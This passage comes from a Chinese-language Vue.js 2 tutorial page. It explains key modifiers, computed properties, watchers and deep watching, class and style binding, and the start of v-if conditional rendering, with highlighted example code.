(1).配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。<br> (2).配合keydown使用：正常触发事件。</p><h4 id="3-3-定制按键别名"><a href="#3-3-定制按键别名" class="headerlink" title="3.3 定制按键别名"></a>3.3 定制按键别名</h4><p> Vue.config.keyCodes.自定义键名 = 键码</p><h4 id="3-4-注意点"><a href="#3-4-注意点" class="headerlink" title="3.4 注意点"></a>3.4 注意点</h4><p> ①Vue未提供别名的按键,可以使用按键原始的key值去绑定,但注意要转为kebab-case(短横线命名)</p><p> ②可以使用KeyCode去指定具体的按键(不推荐)</p> <pre class="language-js" data-language="js"><code class="language-js"> <span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"root"</span><span class="token operator">></span><span class="token operator">&lt;</span>h2<span class="token operator">></span>欢迎来到<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>学习<span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span><span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"text"</span> placeholder<span class="token operator">=</span><span class="token string">"按下回车提示输入"</span> @keydown<span class="token punctuation">.</span>huiche<span class="token operator">=</span><span class="token string">"showInfo"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span> <span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span><span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>el<span class="token operator">:</span><span class="token string">'#root'</span><span class="token punctuation">,</span>data<span class="token operator">:</span><span class="token punctuation">&#123;</span>name<span class="token operator">:</span><span class="token string">'辉煌集团'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>methods<span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token function">showInfo</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">// console.log(e.key,e.keyCode)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><h2 id="八、计算属性"><a href="#八、计算属性" class="headerlink" title="八、计算属性"></a>八、计算属性</h2><h3 id="1-定义"><a href="#1-定义" class="headerlink" title="1.定义"></a>1.定义</h3><p> 要用的属性不存在,需要通过已有属性计算得来</p><h3 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h3><p> 底层借助了Objece.defineproperty方法提供的getter和setter</p><h3 id="3-get函数何时执行"><a href="#3-get函数何时执行" class="headerlink" title="3.get函数何时执行"></a>3.get函数何时执行</h3><p> ①初次读取时会执行一次<br> ②当依赖的数据发生改变时会再次被调用</p><h3 id="4-优势"><a href="#4-优势" class="headerlink" title="4.优势"></a>4.优势</h3><p> 与methods实现相比,内部有缓存机制(复用),效率更高,调试更方便</p><h3 id="5-备注"><a href="#5-备注" class="headerlink" title="5.备注"></a>5.备注</h3><p> ①计算属性最终会出现在vm上,直接读取使用即可<br> ②如果计算属性要被修改,那必须写set函数去响应修改,且set中要引起计算时依赖的数据发生改变</p> <pre class="language-js" data-language="js"><code class="language-js"> <span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"root"</span><span class="token operator">></span>姓：<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"text"</span> v<span class="token operator">-</span>model<span class="token operator">=</span><span class="token string">"firstName"</span><span class="token operator">></span> <span class="token operator">&lt;</span>br<span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">/</span><span class="token operator">></span>名：<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"text"</span> v<span class="token operator">-</span>model<span class="token operator">=</span><span class="token string">"lastName"</span><span class="token operator">></span> <span class="token operator">&lt;</span>br<span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">/</span><span class="token operator">></span>测试：<span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"text"</span> v<span class="token operator">-</span>model<span class="token operator">=</span><span class="token string">"x"</span><span class="token operator">></span> <span class="token operator">&lt;</span>br<span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">/</span><span class="token operator">></span>全名：<span class="token operator">&lt;</span>span<span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>fullName<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">></span> <span class="token operator">&lt;</span>br<span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 全名：<span class="token operator">&lt;</span>span<span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>fullName<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">></span> <span class="token operator">&lt;</span>br<span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">/</span><span class="token operator">></span>全名：<span class="token operator">&lt;</span>span<span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>fullName<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">></span> <span class="token operator">&lt;</span>br<span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">/</span><span class="token operator">></span>全名：<span class="token operator">&lt;</span>span<span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>fullName<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">></span> <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span> <span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span><span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>el<span class="token operator">:</span><span class="token string">'#root'</span><span class="token punctuation">,</span>data<span class="token operator">:</span><span class="token punctuation">&#123;</span>firstName<span class="token operator">:</span><span class="token string">'张'</span><span class="token punctuation">,</span>lastName<span class="token operator">:</span><span class="token string">'三'</span><span class="token punctuation">,</span>x<span class="token operator">:</span><span class="token string">'你好'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>computed<span class="token operator">:</span><span class="token punctuation">&#123;</span>fullName<span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token comment">//get有什么作用？当有人读取fullName时，get就会被调用，且返回值就作为fullName的值</span><span class="token comment">//get什么时候调用？1.初次读取fullName时。2.所依赖的数据发生变化时。</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'get被调用了'</span><span class="token punctuation">)</span><span class="token comment">// console.log(this) //此处的this是vm</span><span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>firstName <span class="token operator">+</span> <span class="token string">'-'</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>lastName<span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token comment">//set什么时候调用? 当fullName被修改时。</span><span class="token function">set</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token comment">// 这里的value是修改之后的值</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'set'</span><span class="token punctuation">,</span>value<span class="token punctuation">)</span> <span class="token keyword">const</span> arr <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span>firstName <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">this</span><span class="token punctuation">.</span>lastName <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><h2 id="九、监视属性"><a href="#九、监视属性" class="headerlink" title="九、监视属性"></a>九、监视属性</h2><h3 id="1-监视属性watch"><a href="#1-监视属性watch" class="headerlink" title="1.监视属性watch"></a>1.监视属性watch</h3><p> ①当被监视的属性变化时,回调函数自动调用,进行相关操作</p><p> ②监视的属性必须存在,才能进行监视</p><p> ③监视的两种写法<br>  Ⅰ.new Vue时传入的watch配置<br>  Ⅱ.通过vm.$watch监视</p> <pre class="language-js" data-language="js"><code class="language-js"> <span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"root"</span><span class="token operator">></span><span class="token operator">&lt;</span>h2<span class="token operator">></span>今天天气很<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>info<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span><span class="token operator">&lt;</span>button @click<span class="token operator">=</span><span class="token string">"changeWeather"</span><span class="token operator">></span>切换天气<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span> <span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span><span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>el<span class="token operator">:</span><span class="token string">'#root'</span><span class="token punctuation">,</span>data<span class="token operator">:</span><span class="token punctuation">&#123;</span>isHot<span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>computed<span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>isHot <span class="token operator">?</span> <span class="token string">'炎热'</span> <span class="token operator">:</span> <span class="token string">'凉爽'</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>methods<span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token function">changeWeather</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>isHot <span class="token operator">=</span> <span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>isHot<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>     <span class="token comment">// 第一种写法</span><span class="token comment">/* watch:&#123;isHot:&#123;immediate:true, //初始化时让handler立即调用一下//handler什么时候调用？当isHot发生改变时。handler(newValue,oldValue)&#123;console.log('isHot被修改了',newValue,oldValue)&#125;&#125;&#125; */</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>   <span class="token comment">// 第二种写法</span>vm<span class="token punctuation">.</span><span class="token function">$watch</span><span class="token punctuation">(</span><span class="token string">'isHot'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>immediate<span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment">//初始化时让handler立即调用一下</span><span class="token comment">//handler什么时候调用？当isHot发生改变时。</span><span class="token function">handler</span><span class="token punctuation">(</span><span class="token parameter">newValue<span class="token punctuation">,</span>oldValue</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'isHot被修改了'</span><span class="token punctuation">,</span>newValue<span class="token punctuation">,</span>oldValue<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><h3 id="2-深度监视"><a href="#2-深度监视" class="headerlink" title="2.深度监视"></a>2.深度监视</h3><p> ①Vue中的watch默认不监测对象内部值的改变(默认监视一层)<br> ②配置deep: true可以监视对象内部值改变(监视多层)</p><p> ③备注<br>  (1).Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以！<br>  (2).使用watch时根据数据的具体结构，决定是否采用深度监视。</p>  <pre class="language-js" data-language="js"><code class="language-js">   <span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"root"</span><span class="token operator">></span><span class="token operator">&lt;</span>h2<span class="token operator">></span>今天天气很<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>info<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span><span class="token operator">&lt;</span>button @click<span class="token operator">=</span><span class="token string">"changeWeather"</span><span class="token operator">></span>切换天气<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span><span class="token operator">&lt;</span>hr<span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span>h3<span class="token operator">></span>a的值是<span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>numbers<span class="token punctuation">.</span>a<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h3<span class="token operator">></span><span class="token operator">&lt;</span>button @click<span class="token operator">=</span><span class="token string">"numbers.a++"</span><span class="token operator">></span>点我让a<span class="token operator">+</span><span class="token number">1</span><span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span><span class="token operator">&lt;</span>h3<span class="token operator">></span>b的值是<span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>numbers<span class="token punctuation">.</span>b<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h3<span class="token operator">></span><span class="token operator">&lt;</span>button @click<span class="token operator">=</span><span class="token string">"numbers.b++"</span><span class="token operator">></span>点我让b<span class="token operator">+</span><span class="token number">1</span><span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span><span class="token operator">&lt;</span>button @click<span class="token operator">=</span><span class="token string">"numbers = &#123;a:666,b:888&#125;"</span><span class="token operator">></span>彻底替换掉numbers<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>numbers<span class="token punctuation">.</span>c<span class="token punctuation">.</span>d<span class="token punctuation">.</span>e<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>   <span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span><span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>el<span class="token operator">:</span><span class="token string">'#root'</span><span class="token punctuation">,</span>data<span class="token operator">:</span><span class="token punctuation">&#123;</span>isHot<span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span>numbers<span class="token operator">:</span><span class="token punctuation">&#123;</span>a<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span>b<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span>c<span class="token operator">:</span><span class="token punctuation">&#123;</span>d<span class="token operator">:</span><span class="token punctuation">&#123;</span>e<span class="token operator">:</span><span class="token number">100</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>computed<span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>isHot <span class="token operator">?</span> <span class="token string">'炎热'</span> <span class="token operator">:</span> <span class="token string">'凉爽'</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>methods<span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token function">changeWeather</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>isHot <span class="token operator">=</span> <span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>isHot<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>watch<span class="token operator">:</span><span class="token punctuation">&#123;</span>isHot<span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token comment">// immediate:true, //初始化时让handler调用一下</span><span class="token comment">//handler什么时候调用？当isHot发生改变时。</span><span class="token function">handler</span><span class="token punctuation">(</span><span class="token parameter">newValue<span class="token punctuation">,</span>oldValue</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'isHot被修改了'</span><span class="token punctuation">,</span>newValue<span class="token punctuation">,</span>oldValue<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token comment">//监视多级结构中某个属性的变化</span><span class="token comment">/* 'numbers.a':&#123;handler()&#123;console.log('a被改变了')&#125;&#125; */</span><span class="token comment">//监视多级结构中所有属性的变化</span>numbers<span class="token operator">:</span><span class="token punctuation">&#123;</span>deep<span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment">// 深度监视</span><span class="token function">handler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'numbers改变了'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre>  <pre class="language-js" data-language="js"><code class="language-js"> 监视属性简写  watch<span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token comment">//正常写法</span><span class="token comment">/* isHot:&#123;// immediate:true, //初始化时让handler调用一下// deep:true,//深度监视handler(newValue,oldValue)&#123;console.log('isHot被修改了',newValue,oldValue)&#125;&#125;, */</span><span class="token comment">//简写</span><span class="token comment">/* isHot(newValue,oldValue)&#123;console.log('isHot被修改了',newValue,oldValue,this)&#125; */</span>    <span class="token comment">//正常写法</span><span class="token comment">/* vm.$watch('isHot',&#123;immediate:true, //初始化时让handler调用一下deep:true,//深度监视handler(newValue,oldValue)&#123;console.log('isHot被修改了',newValue,oldValue)&#125;&#125;) */</span><span class="token comment">//简写</span><span class="token comment">/* vm.$watch('isHot',(newValue,oldValue)=>&#123;console.log('isHot被修改了',newValue,oldValue,this)&#125;) */</span><span class="token punctuation">&#125;</span></code></pre><h3 id="3-computed和watch之间的区别"><a href="#3-computed和watch之间的区别" class="headerlink" title="3.computed和watch之间的区别"></a>3.computed和watch之间的区别</h3><p> 1.computed能完成的功能,watch都可以完成</p><p> 2.watch能完成的功能,computed不一定能完成,例如:watch可以进行异步操作</p><p> 3.两个重要的小原则<br>  Ⅰ.所被Vue管理的函数,最好写成普通函数,这样this的指向才是vm 或 组件实例对象</p><p>  Ⅱ.所有不被Vue所管理的函数(定时器的回调函数、ajax回调函数等、promise的回调函数),最好写成箭头函数,这样this的指向才是vm 或 组件实例对象</p><h2 id="十、绑定样式"><a href="#十、绑定样式" class="headerlink" title="十、绑定样式"></a>十、绑定样式</h2><h3 id="1-class样式"><a href="#1-class样式" class="headerlink" title="1. class样式"></a>1. class样式</h3><p> 写法:class=”xxx” xxx可以是字符串、对象、数组。</p><p> 字符串写法适用于：类名不确定，要动态获取。</p><p> 对象写法适用于：要绑定多个样式，个数不确定，名字也不确定。</p><p> 数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。</p><h3 id="2-style样式"><a href="#2-style样式" class="headerlink" title="2. style样式"></a>2. style样式</h3><p> :style=”{fontSize: xxx}”其中xxx是动态值。</p><p> :style=”[a,b]”其中a、b是样式对象。</p> <pre class="language-js" data-language="js"><code class="language-js"> <span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"root"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 绑定<span class="token keyword">class</span>样式<span class="token operator">--</span>字符串写法，适用于：样式的类名不确定，需要动态指定 <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"basic"</span> <span class="token operator">:</span><span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"mood"</span> @click<span class="token operator">=</span><span class="token string">"changeMood"</span><span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span> <span class="token operator">&lt;</span>br<span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 绑定<span class="token keyword">class</span>样式<span class="token operator">--</span>数组写法，适用于：要绑定的样式个数不确定、名字也不确定 <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"basic"</span> <span class="token operator">:</span><span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"classArr"</span><span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span> <span class="token operator">&lt;</span>br<span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 绑定<span class="token keyword">class</span>样式<span class="token operator">--</span>对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"basic"</span> <span class="token operator">:</span><span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"classObj"</span><span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span> <span class="token operator">&lt;</span>br<span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 绑定style样式<span class="token operator">--</span>对象写法 <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"basic"</span> <span class="token operator">:</span>style<span class="token operator">=</span><span class="token string">"styleObj"</span><span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span> <span class="token operator">&lt;</span>br<span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 绑定style样式<span class="token operator">--</span>数组写法 <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"basic"</span> <span class="token operator">:</span>style<span class="token operator">=</span><span class="token string">"styleArr"</span><span class="token operator">></span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span> <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>  <span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">></span><span class="token keyword">const</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>el<span class="token operator">:</span><span class="token string">'#root'</span><span class="token punctuation">,</span>data<span class="token operator">:</span><span class="token punctuation">&#123;</span>name<span class="token operator">:</span><span class="token string">'尚硅谷'</span><span class="token punctuation">,</span>mood<span class="token operator">:</span><span class="token string">'normal'</span><span class="token punctuation">,</span>classArr<span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">'atguigu1'</span><span class="token punctuation">,</span><span class="token string">'atguigu2'</span><span class="token punctuation">,</span><span class="token string">'atguigu3'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>classObj<span class="token operator">:</span><span class="token punctuation">&#123;</span>atguigu1<span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">,</span>atguigu2<span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>styleObj<span class="token operator">:</span><span class="token punctuation">&#123;</span>fontSize<span class="token operator">:</span> <span class="token string">'40px'</span><span class="token punctuation">,</span>color<span class="token operator">:</span><span class="token string">'red'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>styleObj2<span class="token operator">:</span><span class="token punctuation">&#123;</span>backgroundColor<span class="token operator">:</span><span class="token string">'orange'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>styleArr<span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span>fontSize<span class="token operator">:</span> <span class="token string">'40px'</span><span class="token punctuation">,</span>color<span class="token operator">:</span><span class="token string">'blue'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>backgroundColor<span class="token operator">:</span><span class="token string">'gray'</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>methods<span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token function">changeMood</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'happy'</span><span class="token punctuation">,</span><span class="token string">'sad'</span><span class="token punctuation">,</span><span class="token string">'normal'</span><span class="token punctuation">]</span><span class="token keyword">const</span> index <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span>mood <span class="token operator">=</span> arr<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><h2 id="十一、条件渲染"><a href="#十一、条件渲染" class="headerlink" title="十一、条件渲染"></a>十一、条件渲染</h2><h3 id="1-v-if"><a href="#1-v-if" class="headerlink" title="1. v-if"></a>1. v-if</h3><p> ①写法: (1)v-if = “表达式” (2)v-else-if = “表达式” (3)v-else = “表达式”</p><p> ②适用<br>  适用于切换频率较低的场景</p><p> ③特点<br>  不展示的DOM元素直接被移除</p><p> ④注意<br>  v-if可以和v-else-if、v-else一起使用,但要求结构不能被”打断”</p> <pre class="language-js" data-language="js"><code class="language-js"> <span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"root"</span><span class="token operator">></span><span class="token operator">&lt;</span>h2<span class="token operator">></span>当前的n值是<span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>n<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>h2<span class="token operator">></span><span class="token operator">&lt;</span>button @click<span class="token operator">=</span><span class="token string">"n++"</span><span class="token operator">></span>点我n<span class="token operator">+</span><span class="token number">1</span><span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 使用v<span class="token operator">-</span><span class="token keyword">if</span>做条件渲染 <span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> <span class="token 